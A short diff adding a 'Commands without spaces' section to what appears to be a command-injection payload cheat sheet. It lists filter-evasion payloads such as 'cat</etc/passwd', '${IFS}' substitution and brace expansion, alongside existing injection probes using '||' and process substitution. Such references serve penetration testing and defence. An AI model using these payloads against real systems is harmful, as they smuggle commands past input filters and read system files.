@@ -46,3 +46,20 @@ ping -c1 || echo injection
 ```
 ping -c 127.0.0.1 <(echo 1 > /tmp/test)
 ```
+
+# Commands without spaces
+
+## 1) Simple
+```
+cat</etc/passwd
+```
+
+## 2) IFS
+```
+ls${IFS}-la
+```
+
+## 3) {}
+```
+{ls,-la}
+```
